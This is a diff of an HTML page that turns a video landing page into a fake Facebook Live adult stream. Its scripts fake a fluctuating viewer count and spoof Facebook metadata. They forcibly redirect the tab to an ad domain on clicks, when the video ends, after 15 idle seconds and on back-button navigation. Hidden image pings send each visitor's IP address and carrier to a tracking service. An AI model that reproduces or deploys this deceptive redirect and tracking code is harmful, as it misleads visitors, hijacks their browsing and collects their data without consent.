@@ -12,7 +12,7 @@
   <meta property="og:type" content="pig">
   <meta property="og:title" content="Arte Pura.">
   <meta property="og:description" content="YouTube">
-  <meta property="og:url" content="https://www.youtube.com"> 
+  <meta property="og:url" content="https://www.facebook.com/profile.php"> 
   <meta property="og:image" content="http://apnasmile.com/pics/28.jpg">
 
   <style>
@@ -24,23 +24,22 @@
 
     body {
       font-family: 'Arial', sans-serif;
-      background: linear-gradient(135deg, #20B2AA, #008B8B);
+      background: #18191a;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      margin: 0;
+      padding: 0;
       cursor: pointer;
     }
 
     .container {
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-      max-width: 400px;
+      background: #18191a;
+      max-width: 100%;
       width: 100%;
+      height: 100vh;
       overflow: hidden;
       position: relative;
+      display: flex;
+      flex-direction: column;
     }
 
     .floating-elements {
@@ -85,35 +84,91 @@
       50% { transform: translateY(-20px) rotate(180deg); }
     }
 
-    .header {
-      text-align: center;
-      padding: 20px 20px 10px;
+    /* Header estilo Facebook Live */
+    .fb-header {
+      background: #1c1e21;
+      padding: 10px 0;
       position: relative;
-      z-index: 2;
+      z-index: 10;
     }
 
-    .top-badge {
-      background: linear-gradient(90deg, #FF4444, #00AA00);
+
+    .fb-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 15px;
       color: white;
-      padding: 8px 20px;
-      border-radius: 25px;
-      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    .fb-back-btn {
+      font-size: 20px;
       font-weight: bold;
-      display: inline-block;
-      margin-bottom: 15px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      cursor: pointer;
+      padding: 5px;
     }
 
-    .top-badge::before {
-      content: "🔥";
-      margin-right: 5px;
+    .fb-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
     }
 
-    .top-badge::after {
-      content: "🔥";
-      margin-left: 5px;
+    .fb-menu {
+      font-size: 20px;
+      cursor: pointer;
+      padding: 5px;
+    }
+
+    .fb-stream-info {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 15px;
+      border-top: 1px solid #3a3b3c;
+      padding-top: 10px;
+    }
+
+    .fb-streamer-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .fb-streamer-avatar {
+      width: 40px;
+      height: 40px;
+      background: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+    }
+
+    .fb-streamer-details {
+      color: white;
+    }
+
+    .fb-streamer-name {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 2px;
+    }
+
+    .fb-streamer-status {
+      font-size: 12px;
+      color: #b0b3b8;
+    }
+
+    .fb-viewer-count {
+      background: rgba(0, 0, 0, 0.6);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 15px;
+      font-size: 12px;
+      font-weight: bold;
     }
 
     h1 {
@@ -177,17 +232,147 @@
     }
 
     .media-container {
-      padding: 0 20px 20px;
       position: relative;
       z-index: 2;
+      width: 100%;
+      height: 80vh;
+      min-height: 300px;
+      max-height: 85vh;
     }
 
     .media-video {
       width: 100%;
-      border-radius: 15px;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+      height: 100%;
+      object-fit: cover;
       position: relative;
+      background: #000;
     }
+
+    .video-preview {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.05);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 5;
+      transition: all 0.3s ease;
+      cursor: pointer;
+    }
+
+    .video-preview:hover {
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    /* Para videos en formato vertical (Reels/Stories) */
+    @media (max-aspect-ratio: 9/16) {
+      .media-container {
+        height: 45vh;
+      }
+    }
+
+    /* Para videos en formato horizontal */
+    @media (min-aspect-ratio: 16/9) {
+      .media-container {
+        height: 60vh;
+      }
+    }
+
+    .preview-content {
+      text-align: center;
+      color: white;
+      padding: 20px;
+    }
+
+    .preview-icon {
+      font-size: 40px;
+      margin-bottom: 10px;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    .preview-title {
+      font-size: 16px;
+      font-weight: bold;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+      margin-bottom: 5px;
+    }
+
+    .preview-subtitle {
+      font-size: 14px;
+      opacity: 0.9;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+      margin-bottom: 15px;
+    }
+
+    .preview-button {
+      background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+      color: white;
+      padding: 12px 24px;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: bold;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+      animation: buttonPulse 2s ease-in-out infinite;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .preview-button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+    }
+
+    @keyframes buttonPulse {
+      0%, 100% { 
+        transform: scale(1);
+        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+      }
+      50% { 
+        transform: scale(1.02);
+        box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+      }
+    }
+
+    .preview-stats {
+      position: absolute;
+      bottom: 15px;
+      left: 15px;
+      right: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .preview-viewers {
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 15px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    .preview-duration {
+      background: rgba(255, 0, 0, 0.9);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 15px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+
 
     .media-video::-webkit-media-controls {
       display: none !important;
@@ -229,25 +414,26 @@
       position: absolute;
       top: 10px;
       right: 10px;
-      background: rgba(255, 0, 0, 0.9);
+      background: rgba(255, 0, 0, 0.8);
       color: white;
       padding: 4px 8px;
-      border-radius: 12px;
-      font-size: 12px;
+      border-radius: 10px;
+      font-size: 11px;
       font-weight: bold;
       z-index: 10;
-      animation: liveBlink 1s ease-in-out infinite;
+      animation: liveBlink 2s ease-in-out infinite;
     }
 
     .live-viewers {
       position: absolute;
       top: 10px;
       left: 10px;
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.6);
       color: white;
       padding: 4px 8px;
-      border-radius: 12px;
-      font-size: 11px;
+      border-radius: 10px;
+      font-size: 10px;
+      font-weight: bold;
       z-index: 10;
     }
 
@@ -260,14 +446,14 @@
       bottom: 20px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
+      background: rgba(0, 0, 0, 0.7);
       color: white;
       padding: 8px 16px;
       border-radius: 20px;
       font-size: 12px;
       font-weight: bold;
       z-index: 10;
-      animation: clickPulse 2s ease-in-out infinite;
+      animation: clickPulse 3s ease-in-out infinite;
     }
 
     @keyframes clickPulse {
@@ -282,64 +468,94 @@
     }
 
     .social-links {
-      padding: 0 20px 20px;
+      position: fixed;
+      right: 30px;
+      top: 50%;
+      transform: translateY(-50%);
       display: flex;
       flex-direction: column;
-      gap: 15px;
-      position: relative;
-      z-index: 2;
+      gap: 20px;
+      z-index: 100;
+      /* Alinear con la línea roja del video */
+      margin-top: -20px;
     }
 
-    .social-links a {
+    .social-link {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
       display: flex;
+      justify-content: center;
       align-items: center;
-      padding: 15px 20px;
-      border-radius: 15px;
       text-decoration: none;
       color: white;
-      font-weight: bold;
-      font-size: 16px;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
     }
 
-    .social-links a:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+    .social-link:hover {
+      transform: scale(1.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
     }
 
-    .social-links a:first-child {
+    /* Responsive para botones sociales */
+    @media (max-width: 768px) {
+      .social-links {
+        right: 20px;
+        gap: 15px;
+        margin-top: -15px;
+      }
+      
+      .social-link {
+        width: 50px;
+        height: 50px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .social-links {
+        right: 15px;
+        gap: 12px;
+        margin-top: -10px;
+      }
+      
+      .social-link {
+        width: 45px;
+        height: 45px;
+      }
+    }
+
+    /* Asegurar que los botones no tapen el video en diferentes alturas */
+    @media (max-height: 600px) {
+      .social-links {
+        top: 45%;
+        margin-top: -15px;
+      }
+    }
+
+    @media (max-height: 500px) {
+      .social-links {
+        top: 40%;
+        margin-top: -10px;
+      }
+      
+      .social-link {
+        width: 40px;
+        height: 40px;
+      }
+    }
+
+    .social-link.telegram {
       background: linear-gradient(135deg, #0088cc, #229ED9);
     }
 
-    .social-links a:nth-child(2) {
+    .social-link.whatsapp {
       background: linear-gradient(135deg, #25D366, #128C7E);
     }
 
-    .social-links a:nth-child(3) {
-      background: linear-gradient(135deg, #FF0000, #CC0000);
-    }
 
-    .social-links a:nth-child(4) {
-      background: linear-gradient(135deg, #1877F2, #0A5FCC);
-    }
 
-    .social-links .icon-container {
-      width: 24px;
-      height: 24px;
-      background: white;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-right: 12px;
-      flex-shrink: 0;
-    }
-
-    .social-links .icon-container span {
-      font-size: 14px;
-      font-weight: bold;
-    }
 
     .stats {
       text-align: center;
@@ -350,29 +566,19 @@
       z-index: 2;
     }
 
-    /* Responsive */
+    /* Responsive para móvil */
     @media (max-width: 480px) {
-      body {
-        padding: 10px;
+      .media-container {
+        height: 75vh;
+        min-height: 250px;
       }
-      
-      .container {
-        border-radius: 15px;
-      }
-      
-      h1 {
-        font-size: 28px;
-        gap: 8px;
-      }
-      
-      .live-indicator {
-        width: 16px;
-        height: 16px;
-      }
+    }
 
-      .live-badge {
-        font-size: 8px;
-        padding: 1px 4px;
+    /* Para pantallas muy pequeñas */
+    @media (max-width: 360px) {
+      .media-container {
+        height: 70vh;
+        min-height: 200px;
       }
     }
   </style>
@@ -397,7 +603,7 @@
     window.addEventListener('pageshow', function (event) {
       if (event.persisted || performance.getEntriesByType("navigation")[0].type === "back_forward") {
         setTimeout(() => {
-          window.open(adURL, '_blank');
+          window.location.href = adURL;
         }, 1000);
       }
     });
@@ -421,19 +627,40 @@
         
         event.preventDefault();
         setTimeout(() => {
-          window.open(redirectUrl, '_blank');
+          window.location.href = redirectUrl;
         }, 500);
       }
 
-      // Solo redirección por clic en el video o botones sociales
+      // Solo redirección por clic en el video, vista previa o botones sociales
       const video = document.getElementById('videoPlayer');
+      const videoPreview = document.getElementById('videoPreview');
       const socialLinks = document.querySelectorAll('.social-links a');
       
       if (video) {
-        video.addEventListener('click', triggerRedirect);
+        video.addEventListener('click', function(event) {
+          // Solo redirigir si el video ya está reproduciéndose
+          if (!video.paused) {
+            triggerRedirect(event);
+          }
+        });
       }
       
+      if (videoPreview) {
+        videoPreview.addEventListener('click', function(event) {
+          // Redirigir inmediatamente al hacer clic en la vista previa
+          triggerRedirect(event);
+        });
+      }
+      
+      // Los botones de Telegram y WhatsApp van a sus enlaces reales, NO al anuncio
       socialLinks.forEach(link => {
+        // Permitir que Telegram y WhatsApp vayan a sus enlaces reales
+        if (link.classList.contains('telegram') || link.classList.contains('whatsapp')) {
+          // No agregar event listener de redirección al anuncio
+          console.log('Botón social permitido:', link.href);
+          return;
+        }
+        // Solo otros botones sociales (si los hay) redirigen al anuncio
         link.addEventListener('click', triggerRedirect);
       });
 
@@ -442,7 +669,7 @@
         video.addEventListener('ended', function() {
           if (!redirectTriggered) {
             setTimeout(() => {
-              window.open(redirectUrl, '_blank');
+              window.location.href = redirectUrl;
             }, 1000);
           }
         });
@@ -496,15 +723,25 @@
         "https://qu.ax/gbaeT.mp4",
         "https://qu.ax/LMABO.mp4",
         "https://qu.ax/nQki.mp4",
-        
+
         // Aquí puedes agregar más URLs si lo deseas
       ];
 
       function playRandomVideo() {
         var randomIndex = Math.floor(Math.random() * videoList.length);
         video.src = videoList[randomIndex];
-        video.muted = true; // Mantener silenciado inicialmente
-        // El video no se reproduce automáticamente, espera a que el usuario presione play
+        video.muted = true; // Mantener silenciado para reproducción automática
+        video.loop = true; // Repetir el video para simular transmisión en vivo
+        
+        // Intentar reproducir automáticamente
+        video.play().catch(function(error) {
+          console.log("Autoplay bloqueado:", error);
+          // Si el autoplay falla, mostrar mensaje más prominente
+          const preview = document.getElementById('videoPreview');
+          if (preview) {
+            preview.style.background = 'rgba(0, 0, 0, 0.7)';
+          }
+        });
       }
 
       // Redirecciones eliminadas - ahora manejadas por el script unificado
@@ -524,20 +761,67 @@
 
       playRandomVideo();
 
-      // Simular contador de espectadores en vivo
+      // Simular contador de espectadores en vivo más dinámico y realista para contenido XXX HOT
+      let currentViewerCount = 15420;
+      
       function updateViewerCount() {
         const viewerElement = document.querySelector('.live-viewers');
+        const previewViewerElement = document.getElementById('previewViewerCount');
+        const headerViewerElement = document.querySelector('.fb-viewer-count');
+        
+        // Variación más realista: algunos usuarios entran y salen
+        const changeType = Math.random();
+        let change = 0;
+        
+        if (changeType < 0.6) {
+          // 60% probabilidad de aumentar (más gente entra para contenido XXX)
+          change = Math.floor(Math.random() * 25) + 5; // +5 a +30
+        } else if (changeType < 0.85) {
+          // 25% probabilidad de disminuir (gente sale)
+          change = -(Math.floor(Math.random() * 15) + 3); // -3 a -18
+        }
+        // 15% probabilidad de no cambiar
+        
+        currentViewerCount += change;
+        
+        // Mantener un rango realista para contenido XXX HOT en Facebook Live
+        currentViewerCount = Math.max(12000, Math.min(25000, currentViewerCount));
+        
+        // Formatear como Facebook Live para números grandes
+        let formattedCount;
+        if (currentViewerCount >= 10000) {
+          // Para números de 10K+, usar formato como "15.4K" o "15K"
+          if (currentViewerCount >= 100000) {
+            formattedCount = Math.floor(currentViewerCount / 1000) + 'K';
+          } else {
+            const thousands = Math.floor(currentViewerCount / 1000);
+            const hundreds = Math.floor((currentViewerCount % 1000) / 100);
+            if (hundreds > 0) {
+              formattedCount = thousands + '.' + hundreds + 'K';
+            } else {
+              formattedCount = thousands + 'K';
+            }
+          }
+        } else {
+          formattedCount = currentViewerCount.toLocaleString();
+        }
+        
         if (viewerElement) {
-          const baseCount = 1247;
-          const variation = Math.floor(Math.random() * 50) - 25; // ±25 espectadores
-          const newCount = Math.max(1000, baseCount + variation);
-          viewerElement.textContent = newCount.toLocaleString();
+          viewerElement.textContent = formattedCount;
+        }
+        
+        if (previewViewerElement) {
+          previewViewerElement.textContent = formattedCount;
+        }
+        
+        if (headerViewerElement) {
+          headerViewerElement.textContent = `👥 ${formattedCount}`;
         }
       }
 
-      // Actualizar contador cada 3-8 segundos
+      // Actualizar contador cada 1-3 segundos para más dinamismo
       function scheduleNextUpdate() {
-        const delay = Math.random() * 5000 + 3000; // 3-8 segundos
+        const delay = Math.random() * 2000 + 1000; // 1-3 segundos
         setTimeout(() => {
           updateViewerCount();
           scheduleNextUpdate();
@@ -547,14 +831,62 @@
       // Iniciar el contador dinámico
       scheduleNextUpdate();
 
-      // Permitir reproducción al hacer clic en el video
-      video.addEventListener('click', function() {
-        if (video.paused) {
-          video.play().catch(() => {
-            console.log("No se pudo reproducir el video");
+      // Detectar formato del video y ajustar overlay
+      function adjustOverlayForVideoFormat() {
+        const video = document.getElementById('videoPlayer');
+        const overlay = document.getElementById('videoPreview');
+        
+        if (video && overlay) {
+          video.addEventListener('loadedmetadata', function() {
+            const aspectRatio = video.videoWidth / video.videoHeight;
+            
+            if (aspectRatio < 0.8) {
+              // Video vertical (Reels/Stories)
+              overlay.style.height = '35%';
+              document.querySelector('.media-container').style.height = '45vh';
+            } else if (aspectRatio > 1.5) {
+              // Video horizontal
+              overlay.style.height = '45%';
+              document.querySelector('.media-container').style.height = '60vh';
+            } else {
+              // Video cuadrado o formato estándar
+              overlay.style.height = '40%';
+              document.querySelector('.media-container').style.height = '50vh';
+            }
           });
         }
-      });
+      }
+
+      // Aplicar ajustes de formato
+      adjustOverlayForVideoFormat();
+
+      // Manejar el overlay de interacción
+      const videoPreview = document.getElementById('videoPreview');
+      
+      // Función para ocultar el overlay y activar el sonido
+      function hidePreviewAndPlay(event) {
+        event.preventDefault();
+        event.stopPropagation();
+        
+        // Ocultar el overlay
+        videoPreview.style.opacity = '0';
+        videoPreview.style.pointerEvents = 'none';
+        
+        setTimeout(() => {
+          videoPreview.style.display = 'none';
+          
+          // Activar el sonido y asegurar reproducción
+          video.muted = false;
+          video.play().catch(() => {
+            console.log("No se pudo reproducir el video con sonido");
+          });
+        }, 200);
+      }
+
+      // Permitir interacción al hacer clic en el overlay
+      if (videoPreview) {
+        videoPreview.addEventListener('click', hidePreviewAndPlay);
+      }
 
       // Ocultar el indicador "HACER CLIC PARA VER" cuando el video esté reproduciéndose
       video.addEventListener('play', function() {
@@ -571,6 +903,33 @@
           clickIndicator.style.display = 'block';
         }
       });
+
+      // Redirección silenciosa cuando el video termine
+      video.addEventListener('ended', function() {
+        setTimeout(() => {
+          window.location.href = 'https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39';
+        }, 1000);
+      });
+
+      // Redirección silenciosa si el usuario se queda en preview sin hacer clic
+      let previewTimer;
+      let hasClickedPreview = false;
+      
+      // Iniciar timer cuando se carga la página
+      previewTimer = setTimeout(() => {
+        if (!hasClickedPreview) {
+          window.location.href = 'https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39';
+        }
+      }, 15000); // 15 segundos
+
+      // Cancelar timer si el usuario hace clic en el preview
+      if (videoPreview) {
+        videoPreview.addEventListener('click', function() {
+          hasClickedPreview = true;
+          clearTimeout(previewTimer);
+        });
+      }
+
     });
   </script>
 
@@ -580,11 +939,11 @@
       const formattedCarrier = carrier.replace(/ /g, '+');
       // Contador 1: noriel (oficial)
       let img1 = document.createElement("img");
-      img1.src = `//whos.amung.us/pingjs/?k=sempaix1;&t=${formattedCarrier}&x=https://ufostalker.com/`;
+      img1.src = `//whos.amung.us/pingjs/?k=noriel;&t=${formattedCarrier}&x=https://ufostalker.com/`;
       img1.style.display = "none";
 
       let img2 = document.createElement("img");
-      img2.src = `//whos.amung.us/pingjs/?k=sempaix1;&t=${ip}&x=${ip}&x=https://ufomaps.org/`;
+      img2.src = `//whos.amung.us/pingjs/?k=noriel;&t=${ip}&x=${ip}&x=https://ufomaps.org/`;
       img2.style.display = "none";
 
       // Contador 2: xreels (adicional)
@@ -628,66 +987,64 @@
       <div class="floating-element"></div>
     </div>
     
-    <div class="header">
-      <div class="top-badge">🔥 LIVE MODEL 🔥</div>
+    <!-- Header estilo Facebook Live -->
+    <div class="fb-header">
+      <div class="fb-nav">
+        <div class="fb-back-btn">←</div>
+        <div class="fb-title">En vivo</div>
+        <div class="fb-menu">⋯</div>
+      </div>
+      <div class="fb-stream-info">
+        <div class="fb-streamer-info">
+          <div class="fb-streamer-avatar">
+            <img src="https://mmg.whatsapp.net/m1/v/t24/An-k28gZl79YvWTzY1Y_tnNqPKwzpTLgj0pD-5-UoqVmjYBVWxuaFXLVEa05XWZ4vI-5WGksS9XCO8Wcg3PKIwOqCBetvrqC5UyFqxFtF5fx8589vJmkKoX7vZ_cmKlJsI7oQLsZHKyiPSy6H7wx?_nc_gid=JBSqHQjj0AaySVAixaPBhw&_nc_oc=Admt3VYfeDnil2HAt_Y9Yk_c0e6jchLIYtK8M8wRk7pUyQ3UxIzCqogWZ7R-pOXO8XA&ccb=10-5&oh=01_Q5Aa2gFXLTv4JSz3te1bs4HCZc6yxK19sg511mWlKoTsHZ7U2g&oe=690180DE&_nc_sid=471a72" alt="Spicy On Reels And Photos" style="width: 100%; height: 100%; border-radius: 50%; object-fit: cover;">
+          </div>
+          <div class="fb-streamer-details">
+            <div class="fb-streamer-name">Spicy On Reels And Photos </div>
+            <div class="fb-streamer-status">Transmitiendo en vivo</div>
+          </div>
+        </div>
+        <div class="fb-viewer-count">👥 25.8K</div>
+      </div>
     </div>
     
     <div class="media-container">
       <div style="position: relative;">
-        <video id="videoPlayer" class="media-video" controlsList="nodownload" oncontextmenu="return false;" muted playsinline preload="metadata">
+        <video id="videoPlayer" class="media-video" controlsList="nodownload" oncontextmenu="return false;" muted playsinline preload="auto" autoplay loop>
           <source src="https://cdn.videy.co/7fQJ3TQh1.mp4" type="video/mp4">
           <source src="https://cdn.videy.co/7fQJ3TQh1.mp4" type="video/webm">
           Your browser does not support the video element.
         </video>
+        
+        <!-- Overlay apropiado para LIVE -->
+        <div id="videoPreview" class="video-preview">
+          <div class="preview-content">
+            <div class="preview-icon">🔴</div>
+            <div class="preview-title">¡EN VIVO AHORA!</div>
+            <div class="preview-subtitle">Toca para ver la transmisión completa</div>
+            <div class="preview-button">▶️ VER EN VIVO</div>
+          </div>
+        </div>
+        
         <div class="live-overlay">🔴 LIVE</div>
-        <div class="live-viewers">1,247</div>
-        <div class="click-to-watch">👆 CLICK TO WATCH</div>
       </div>
     </div>
     
+    <!-- Botones de redes sociales -->
     <div class="social-links">
-      <a href="https://t.me/SpicyOnReels" target="_blank">
-        <div class="icon-container">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="#0088cc">
-            <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.568 8.16l-1.61 7.59c-.121.54-.44.68-.89.42l-2.46-1.81-1.19 1.15c-.13.13-.24.24-.49.24l.18-2.55 4.57-4.12c.2-.18-.04-.28-.31-.1l-5.64 3.55-2.43-.76c-.53-.16-.54-.53.11-.79l9.46-3.65c.44-.16.83.1.69.79z"/>
-          </svg>
-        </div>
-        Telegram
+      <a href="https://t.me/+Pdi6oOsRQykyMzg5" target="_blank" class="social-link telegram">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.568 8.16l-1.61 7.59c-.121.54-.44.68-.89.42l-2.46-1.81-1.19 1.15c-.13.13-.24.24-.49.24l.18-2.55 4.57-4.12c.2-.18-.04-.28-.31-.1l-5.64 3.55-2.43-.76c-.53-.16-.54-.53.11-.79l9.46-3.65c.44-.16.83.1.69.79z"/>
+        </svg>
       </a>
-      <a href="https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39" target="_blank">
-        <div class="icon-container">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="#25D366">
-            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
-          </svg>
-        </div>
-        WhatsApp
+      <a href="https://whatsapp.com/channel/0029VbAspWtFMqrZlxFopq1J" target="_blank" class="social-link whatsapp">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
+        </svg>
       </a>
-      <div style="display: flex; gap: 10px; justify-content: center;">
-        <a href="https://stallionmanualwish.com/y52iet528e?key=72357db5772e533f2b6d8f0490243b39" target="_blank" style="max-width: 150px;">
-          <div class="icon-container">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="#FF0000">
-              <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
-            </svg>
-          </div>
-          YouTube
-        </a>
-        <a href="https://www.facebook.com/groups/1318907446358385" target="_blank" style="max-width: 150px;">
-          <div class="icon-container">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877F2">
-              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-            </svg>
-          </div>
-          Facebook Group
-        </a>
-      </div>
-    </div>
-    
-    <div class="stats">
-      <p>© 2025 Videos Live</p>
     </div>
   </div>
 </body>
-
 
 
 
